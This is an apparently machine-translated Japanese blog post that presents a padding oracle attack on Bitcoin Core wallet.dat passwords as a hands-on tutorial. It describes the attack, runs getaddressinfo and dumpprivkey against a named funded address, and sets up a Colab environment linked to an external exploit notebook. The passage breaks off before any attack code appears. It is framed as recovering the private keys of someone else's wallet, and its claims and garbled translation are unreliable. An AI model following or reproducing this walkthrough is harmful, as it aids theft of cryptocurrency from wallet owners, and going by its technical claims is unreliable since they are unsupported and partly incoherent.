# 人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/0aCfT-kCRlw?si=4WBhkNaS1Yw4okF6" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://capec.mitre.org/data/definitions/463.html" target="_blank" rel="noreferrer noopener">この記事では、サイバーセキュリティ リソース[CAPEC™]</a>からの一般的な攻撃パターンの分類を使用します。<a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">「パディング オラクル攻撃」は、</a>&nbsp;2012 年に<a href="https://en.bitcoin.it/wiki/Wallet" target="_blank" rel="noreferrer noopener">Wallet.dat&nbsp;</a><em>(脆弱性管理および脅威分析プラットフォーム<a href="https://github.com/vuldb" target="_blank" rel="noreferrer noopener"><strong>「VulDB」</strong></a>上)</em>で最初に議論されました。最も人気のある<strong><a href="https://github.com/bitcoin/bitcoin" target="_blank" rel="noreferrer noopener">Bitcoin Core</a></strong><strong><code>AES Encryption Padding</code></strong>ウォレットの問題がファイル内の&nbsp;作業に影響を与える&nbsp;<strong><code>Wallet.dat</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>この攻撃の技術的な詳細は次のように判明しています。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4104,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-71-1024x250.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4104"/><figcaption class="wp-element-caption"><a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" target="_blank" rel="noreferrer noopener">https://en.wikipedia.org/wiki/Padding_oracle_攻撃</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>暗号文を復号するときにパディングエラーが発生したかどうかに関する情報がターゲットシステムから漏洩すると、攻撃者は復号キーを知らなくてもデータを効果的に復号できます。&nbsp;このタイプの情報を送信するターゲット システムはパディング オラクルとなり、攻撃者はこのオラクルを使用して、復号キーを知らなくてもデータを効率的に復号し、<code>128*b</code>パディング オラクルへの平均呼び出しを発行できます (ここで、 はパディング オラクル<code>b</code>のバイト数です)。暗号文ブロック）。&nbsp;攻撃者は、復号化を実行するだけでなく、暗号化キーを知らなくても、パディング オラクルを使用して有効な暗号文を作成する (つまり、暗号化を実行する) こともできます。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4107} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-72.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4107"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>暗号化されたメッセージが復号前にその正当性を確認するために認証されず、パディング エラー情報が攻撃者に渡される場合、どの暗号システムでもパディング オラクル攻撃に対して脆弱になる可能性があります。&nbsp;この攻撃方法は、たとえば、CAPTCHA システムを破壊したり、クライアント側のオブジェクト (隠しフィールドや Cookie など) に保存されている状態情報を復号化/変更するために使用される可能性があります。&nbsp;</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4110} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-75.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4110"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>この攻撃手法は、暗号システムに対するサイドチャネル攻撃であり、不十分に実装された復号化手順から漏洩したデータを使用して、暗号システムを完全に破壊します。攻撃者が暗号システムを破るには、復号化中にパディング エラーが発生したかどうかを伝える 1 ビットの情報があれば、それがどのような形式であっても十分です。この情報は、明示的な完了エラー メッセージ、空白ページが返される、またはサーバーの応答に時間がかかっている (タイミング攻撃) という形式で送信される場合があります。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4111} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-76.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4111"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>この攻撃はクロスドメイン モードで開始される可能性があり、攻撃者はクロスドメイン情報漏洩を利用して、被害者が対話しているターゲット システム/サービスのパディング オラクルから情報の一部を取得できます。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4112} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-77.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4112"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>対称暗号化では、パディング オラクル攻撃は、AES-256-CBC 暗号化モード (ビットコイン コアで使用される) で実行できます。このモードでは、「オラクル」 (ソース) が、暗号化されたメッセージのパディングが正しいかどうかを通信します。ない。&nbsp;このようなデータにより、攻撃者は暗号化キーを知らなくても、オラクル キーを使用してオラクル経由でメッセージを復号化できる可能性があります&nbsp;<strong>。</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4117} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-78-1024x396.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4117"/><figcaption class="wp-element-caption">Wallet.dat への Oracle 攻撃プロセスのパディング</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>実践的な部分に移り、このエクスプロイトを通じて一連のアクションを実行して、その過程で Wallet.dat ファイルに oracle を入力し、最終的にバイナリ形式で必要なパスワードを見つけます。</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4122} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-79.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4122"/><figcaption class="wp-element-caption"><code>Capture The Flag (CTF)</code></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>以前、研究者とトーナメント参加者は、<code>CTF</code>ハッキングされた [&nbsp;<a href="https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat" target="_blank" rel="noreferrer noopener">wallet.dat&nbsp;<em>2023</em></a>&nbsp;] ビットコイン ウォレット:&nbsp;<strong><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></strong>金額<em>:&nbsp;</em><strong><code><strong><code>44502.42</code></strong></code>&nbsp;米ドル // BITCOIN:&nbsp;を公開しました。<code>1.17<strong>461256</strong>&nbsp;BTC</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4134,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-80.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4134"/><figcaption class="wp-element-caption"><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener">Bitcoin Core バージョン 22.1</a>へのリンクをたどってみましょう。<code>releases</code><a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4138,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-81-1024x507.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4138"/></a><figcaption class="wp-element-caption">https://github.com/bitcoin/bitcoin/releases</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading">/bin/bitcoin-core-22.1/ のインデックス</h1>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://bitcoincore.org/bin/">../ </a><a href="https://bitcoincore.org/bin/bitcoin-core-22.1/test.rc1/">test.rc1/</a> 2022年11月8日 18:08 - <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/test.rc2/">test.rc2/</a> 2022年 11月28日 09:39 - <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/SHA256SUMS">SHA256SUMS</a> 2022年12月14日 17:59 2353 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/SHA256SUMS.asc">SHA256SUMS.asc</a> 2022年12月 14日 17:59 10714 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/SHA256SUMS.ots">SHA256SUMS.ots</a> 2022年12月14日 17:59 538 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-aarch64-linux-gnu.tar.gz">bitcoin-22.1-aarch64-linux-gnu.tar.gz</a> 2022年12月14日 17:59 34264786 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-arm-linux-gnueabihf.tar.gz">bitcoin-22.1-arm-linux-gnueabihf.tar.gz</a> 14- 2022 年 12 月 18:00 30424198 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-osx-signed.dmg">bitcoin-22.1-osx-signed.dmg</a> 2022 年 12 月 14 日 18:00 14838454 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-osx64.tar.gz">bitcoin-22.1-osx64.tar.gz</a> 2022 年 12 月 14 日 18:00 27930578 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-powerpc64-linux-gnu.tar.gz">bitcoin-22.1-powerpc64-linux -gnu.tar.gz</a> 2022 年 12 月 14 日 18:00 39999102 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-powerpc64le-linux-gnu.tar.gz">bitcoin-22.1-powerpc64le-linux-gnu.tar.gz</a> 2022 年 12 月 14 日 18:00 38867643 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-riscv64-linux-gnu.tar.gz">bitcoin-22.1-riscv64-linux-gnu.tar.gz</a> 14-DEC-2022 18:01 34114511 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-win64-setup.exe">BITCOIN-22.1-WIN64-SETUP.EXE</a> 14-DEC-2022 18:01 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-x86_64-linux-gnu.tar.gz">18771672 </a><a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-win64.zip">BITCOIN-22.1-WIN64.zip </a><a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-x86_64-linux-gnu.tar.gz">-gnu.tar.gz</a> 14-Dec-2022 18:01 35964880 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1.tar.gz">bitcoin-22.1.tar.gz</a> 14-Dec-2022 18:01 8122372 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1.torrent">bitcoin-22.1.torrent</a> 14-Dec-2022 18:01 49857</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener">Bitcoin Core バージョン 22.1</a>をインストールする<a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener"></a></h2>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif.gif" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">必然的に！QT プログラムを再起動 // ビットコイン コアを再起動</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>次のキーを押します。<strong><code>Ctrl + Q</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code><strong>QT</strong></code>新しいものを同期するには、プログラムを再起動する必要があります。<code><strong>wallet.dat</strong></code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif01.gif" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">getaddressinfo コマンドを使用して確認してみましょう ビットコインウォレット:&nbsp;&nbsp;<strong><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></strong>&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>getaddressinfo "address"

Return information about the given bitcoin address.
Some of the information will only be present if the address is in the active wallet.
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>コマンドを実行しましょう:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>getaddressinfo 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b </code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>結果：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>{
  "address": "1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b",
  "scriptPubKey": "76a9147774801e52a110aba2d65ecc58daf0cfec95a09f88ac",
  "ismine": true,
  "solvable": true,
  "desc": "pkh(&#91;7774801e]02ad103ef184f77ab673566956d98f78b491f3d67edc6b77b2d0dfe3e41db5872f)#qzqmjdel",
  "iswatchonly": false,
  "isscript": false,
  "iswitness": false,
  "pubkey": "02ad103ef184f77ab673566956d98f78b491f3d67edc6b77b2d0dfe3e41db5872f",
  "iscompressed": true,
  "ischange": false,
  "timestamp": 1,
  "labels": &#91;
    ""
  ]
}</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif02.gif" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">dumpprivkey コマンドを実行して、ビットコイン ウォレットの秘密キーを取得しましょう:&nbsp;&nbsp;<strong><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></strong>&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>dumpprivkey "address"

Reveals the private key corresponding to 'address'.
Then the importprivkey can be used with this output</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>コマンドを実行しましょう:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>dumpprivkey 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b
</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>結果：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Error: Please enter the wallet passphrase with walletpassphrase first. (code -13)</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif03.gif" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">ビットコイン ウォレットの</a>秘密キーへのアクセスは&nbsp;パスワードで保護されていることがわかります。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>passphrase ?!?!?
passphrase ?!?!?
passphrase ?!?!?</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>実行してパスワードをバイナリ形式に復号化しましょう。このためには、&nbsp;<strong><a href="https://github.com/bitcoin/bitcoin.git">Bitcoin Core 統合/ステージング ツリー</a></strong><code><strong>Padding Oracle Attack на Wallet.dat</strong></code>リポジトリをインストールする必要があります。このために、&nbsp;&nbsp;<strong><a href="https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt" target="_blank" rel="noreferrer noopener">Jupyter Notebook&nbsp;から完成したファイルを開いて、&nbsp;</a></strong><strong><a href="https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt" target="_blank" rel="noreferrer noopener">&nbsp;Google Colab&nbsp;</a></strong>ノートブックにアップロードできます)。<strong><a href="https://github.com/bitcoin/bitcoin.git"></a></strong><strong><a href="https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt" target="_blank" rel="noreferrer noopener"></a></strong><strong><a href="https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3896,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-29-1024x164.png" alt="Libbitcoin Explorer 3.x ライブラリの Milk Sad 脆弱性、ビットコイン ウォレット (BTC) ユーザーからの 90 万ドルの盗難がどのように実行されたのか" class="wp-image-3896"/></a><figcaption class="wp-element-caption"><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat">ht&nbsp;</a><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener">tps://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracle AttackonWalletdat</a></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Padding_Oracle_Attack_on_Wallet_dat.ipynb</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>リンクを使用して<a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener">Google Colab</a>サービスを開いてみましょう:&nbsp;<a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener">https://colab.research.google.com</a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3735} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-11.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-3735"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>をクリックし<strong><code>"+"</code></strong>て<em><strong>「新しいメモ帳を作成」</strong></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3738} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-12.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-3738"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Google Colab に Ruby をインストールする</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":3740} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-13-1024x487.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-3740"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>必要なプログラムを実行するために、オブジェクト指向プログラミング言語<a href="https://www.ruby-lang.org/" target="_blank" rel="noreferrer noopener"><strong>Rubyをインストールします。</strong></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!sudo apt install ruby-full</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4167} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-82-1024x750.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4167"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>インストールバージョンを確認してみよう</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!ruby --version</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":3747} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-15.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-3747"/><figcaption class="wp-element-caption">Ruby バージョン 3.0.2p107 (2021-07-07 リビジョン 0db68f0233) [x86_64-linux-gnu]</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>'bitcoin-ruby'</code>ビットコインプロトコル/ネットワークと対話するためのライブラリをインストールしましょう</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install bitcoin-ruby</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4168} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-83-1024x674.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4168"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>'ecdsa'</code>楕円曲線デジタル署名アルゴリズム (ECDSA) を実装するためのライブラリをインストールしましょう</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install ecdsa</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4169} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-84-1024x384.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4169"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>'base58'</code>整数または 2 進数を<code>base58</code>相互に変換するライブラリをインストールしましょう。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install base58</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4171} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-85.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4171"/></figure>
<!-- /wp:image -->

